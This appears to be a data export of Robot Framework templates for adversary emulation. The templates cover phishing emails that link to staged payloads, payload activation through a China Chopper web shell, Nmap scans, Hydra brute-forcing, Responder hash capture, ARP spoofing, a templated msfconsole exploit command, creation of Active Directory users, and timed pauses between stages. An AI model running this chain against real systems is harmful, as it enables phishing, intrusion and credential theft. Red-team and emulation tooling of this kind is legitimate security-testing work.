description: Complete Robot Framework utility library modules for automation and infrastructure setup

documents.name: Create Phishing Email
documents.description: Construct phishing email with sender, targets, subject, and body
documents.robotTemplate: Create the Phishing Email    host_ip=${host_ip}    port=${port}    sender=${sender}    target_list=${target_list}    email_header=${email_header}    email_body=${email_body}    attachment=${attachment}    payload_name=${payload_name}

parameters.label: HTTP Server IP
parameters.description: IP of HTTP server hosting payload

parameters.label: Target List File
parameters.description: File with target emails (one per line)

parameters.label: Payload Filename
parameters.description: Name of payload for download link

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: Send Phishing Email
documents.description: Send configured phishing email via SMTP

inputs.label: Phishing Email
inputs.description: Configured email from Create Phishing Email

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: Start HTTP Server
documents.description: Start local HTTP server for payload staging
documents.robotTemplate: Start Local HTTP Server    host_directory=${host_directory}    upload_directory=${upload_directory}    http_server_port=${http_server_port}

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: Stop HTTP Server
documents.description: Stop running HTTP server

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: China Chopper Web Shell
documents.description: Execute commands via China Chopper web shell
documents.robotKeyword: Copy and Activate Payload using Chinachopper
documents.robotTemplate: Copy and Activate Payload using Chinachopper    webshell_server=${webshell_server}    payload_location=${payload_location}    payload_name=${payload_name}    http_url=${http_url}    beacon_filename=${beacon_filename}

parameters.label: Target Payload Path
parameters.description: Where to save payload on target

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: Nmap Network Scan
documents.description: Run Nmap scan against target network
documents.robotTemplate: Run Nmap Scan    host=${host}    username=${username}    password=${password}    target_ip=${target_ip}

parameters.label: Scanner Host
parameters.description: Linux box to run scan from

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: Hydra Password Attack
documents.description: Run Hydra password brute force attack
documents.robotTemplate: Run Hydra    host=${host}    username=${username}    password=${password}    target_ip=${target_ip}

parameters.label: Attacker Host
parameters.description: Linux box to run Hydra from

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: Open SSH Terminal
documents.description: Open SSH connection to remote Linux system
documents.robotTemplate: Get Linux Terminal    host=${host}    username=${username}    password=${password}    alias=${alias}

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: Execute SSH Command
documents.description: Run command on existing SSH connection
documents.robotTemplate: Run Linux Command    host=${host}    username=${username}    password=${password}    command=${command}

metadata.changeLog: Initial creation from Robot Framework utilities

documents.name: Responder MITM
documents.description: Run Responder to poison LLMNR/NBT-NS and capture hashes

documents.name: ARP Spoofing Attack
documents.description: Perform ARP spoofing to intercept network traffic

documents.name: Metasploit Exploit
documents.description: Run Metasploit exploit module
documents.shellCommand: msfconsole -q -x "use ${exploit_module}; set RHOSTS ${target_host}; set LHOST ${lhost}; set PAYLOAD ${payload}; run"

documents.name: Create AD User
documents.description: Create new Active Directory user account

documents.description: Add user to Active Directory security group

documents.description: Pause execution between commands (60-120s)

documents.description: Pause between operation stages (45-60min)
